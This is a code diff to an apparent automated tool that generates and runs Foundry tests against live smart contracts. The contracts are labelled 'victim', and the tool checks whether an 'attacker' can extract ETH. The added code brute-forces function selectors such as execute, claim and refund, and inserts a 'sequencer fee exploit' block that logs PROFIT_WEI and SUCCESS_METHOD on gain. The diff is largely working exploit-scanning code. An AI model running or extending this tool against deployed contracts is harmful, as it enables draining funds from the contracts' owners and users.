@@ -58,6 +58,10 @@ contract HoneypotTestToken is Test {
     function testSafeCycleToken() public {
         vm.startPrank(attacker);
         
+        console.log("Contract ETH Balance:", address(victim).balance);
+
+        <SEQUENCER_FEE_LOGIC>
+
         // 1. Start with ETH (0.0001 ETH)
         uint256 startEth = 0.0001 ether;
         vm.deal(attacker, startEth * 2); // buffer for gas
@@ -149,6 +153,11 @@ contract HoneypotTestToken is Test {
         if (!success) (success, ) = victim.call(abi.encodeWithSignature("mint(uint256)", tokenAmount));
         if (!success) (success, ) = victim.call(abi.encodeWithSignature("stake(uint256)", tokenAmount));
         if (!success) (success, ) = victim.call(abi.encodeWithSignature("contribute(uint256)", tokenAmount));
+        // Try Brute-force/ABI Sniffing
+        if (!success) (success, ) = victim.call(abi.encodeWithSignature("execute()"));
+        if (!success) (success, ) = victim.call(abi.encodeWithSignature("claim()"));
+        if (!success) (success, ) = victim.call(abi.encodeWithSignature("claim(uint256)", tokenAmount));
+        if (!success) (success, ) = victim.call(abi.encodeWithSignature("refund()"));
         // Fallback: Raw call with 1 wei
         if (!success) (success, ) = victim.call{value: 1 wei}("");
 
@@ -268,6 +277,10 @@ contract HoneypotTestETH is Test {
     function testSafeCycleETH() public {
         vm.startPrank(attacker);
         
+        console.log("Contract ETH Balance:", address(victim).balance);
+
+        <SEQUENCER_FEE_LOGIC>
+        
         uint256 amount = 0.0001 ether;
         vm.deal(attacker, amount * 2); 
         
@@ -284,6 +297,10 @@ contract HoneypotTestETH is Test {
         if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("stake()"));
         if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("contribute()"));
         if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("enter()"));
+        // Try Brute-force/ABI Sniffing
+        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("execute()"));
+        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("claim()"));
+        if (!success) (success, ) = victim.call{value: amount}(abi.encodeWithSignature("refund()"));
         // Fallback: Raw call with 1 wei
         if (!success) (success, ) = victim.call{value: 1 wei}("");
 
@@ -382,7 +399,39 @@ def _get_self_destruct_logic(selectors: List[str]) -> str:
         """
     return logic
 
-def generate_honeypot_test_token(victim_address: str, token_address: str, rpc_url: str, weth_address: str, router_address: str, self_destruct_selectors: List[str] = None) -> str:
+def _get_sequencer_fee_logic(bug_type: Optional[str]) -> str:
+    if bug_type != "sequencer_fee":
+        return ""
+    
+    return """
+        // Adaptive Simulation for Sequencer Fee
+        // Try calling any public function (or raw call) with 0.0001 ETH
+        // and check if balance increases (due to GASPRICE manipulation or L2 logic)
+        vm.deal(attacker, 1 ether); // Ensure enough funds
+        uint256 sfBalBefore = attacker.balance;
+        
+        bool sfSuccess;
+        // Try raw call first
+        (sfSuccess, ) = victim.call{value: 0.0001 ether}("");
+        
+        if (!sfSuccess) {
+            // Try common functions if raw fails
+             (sfSuccess, ) = victim.call{value: 0.0001 ether}(abi.encodeWithSignature("execute()"));
+        }
+        
+        if (sfSuccess) {
+             uint256 sfBalAfter = attacker.balance;
+             // Check if we profited
+             if (sfBalAfter > sfBalBefore) {
+                 console.log("PROFIT_WEI:", sfBalAfter - sfBalBefore);
+                 console.log("SUCCESS_METHOD: sequencer_fee_exploit");
+                 vm.stopPrank();
+                 return;
+             }
+        }
+    """
+
+def generate_honeypot_test_token(victim_address: str, token_address: str, rpc_url: str, weth_address: str, router_address: str, self_destruct_selectors: List[str] = None, bug_type: Optional[str] = None) -> str:
     content = HONEYPOT_TEST_TEMPLATE.replace("<VICTIM_ADDRESS>", victim_address)
     content = content.replace("<TOKEN_ADDRESS>", token_address)
     content = content.replace("<RPC_URL>", rpc_url)
@@ -391,15 +440,21 @@ def generate_honeypot_test_token(victim_address: str, token_address: str, rpc_ur
     
     sd_logic = _get_self_destruct_logic(self_destruct_selectors)
     content = content.replace("<SELF_DESTRUCT_LOGIC>", sd_logic)
+
+    sf_logic = _get_sequencer_fee_logic(bug_type)
+    content = content.replace("<SEQUENCER_FEE_LOGIC>", sf_logic)
     
     return content
 
-def generate_honeypot_test_eth(victim_address: str, rpc_url: str, self_destruct_selectors: List[str] = None) -> str:
+def generate_honeypot_test_eth(victim_address: str, rpc_url: str, self_destruct_selectors: List[str] = None, bug_type: Optional[str] = None) -> str:
     content = HONEYPOT_TEST_ETH_TEMPLATE.replace("<VICTIM_ADDRESS>", victim_address)
     content = content.replace("<RPC_URL>", rpc_url)
     
     sd_logic = _get_self_destruct_logic(self_destruct_selectors)
     content = content.replace("<SELF_DESTRUCT_LOGIC>", sd_logic)
+
+    sf_logic = _get_sequencer_fee_logic(bug_type)
+    content = content.replace("<SEQUENCER_FEE_LOGIC>", sf_logic)
     
     return content
 
@@ -414,7 +469,7 @@ def run_honeypot_simulation_token(victim_address: str, token_address: str, rpc_u
         if sd_selectors:
             logger.info(f"Injecting Self-Destruct selectors for {target}")
 
-    test_content = generate_honeypot_test_token(victim_address, token_address, rpc_url, weth_address, router_address, sd_selectors)
+    test_content = generate_honeypot_test_token(victim_address, token_address, rpc_url, weth_address, router_address, sd_selectors, bug_type)
     return _run_forge_test(victim_address, test_content)
 
 def run_honeypot_simulation_eth(victim_address: str, rpc_url: str, w3: Optional[Web3] = None, implementation_address: Optional[str] = None, bug_type: Optional[str] = None) -> Dict[str, Any]:
@@ -428,7 +483,7 @@ def run_honeypot_simulation_eth(victim_address: str, rpc_url: str, w3: Optional[
         if sd_selectors:
             logger.info(f"Injecting Self-Destruct selectors for {target}")
 
-    test_content = generate_honeypot_test_eth(victim_address, rpc_url, sd_selectors)
+    test_content = generate_honeypot_test_eth(victim_address, rpc_url, sd_selectors, bug_type)
     return _run_forge_test(victim_address, test_content)
 
 def _run_forge_test(victim_address: str, test_content: str) -> Dict[str, Any]:
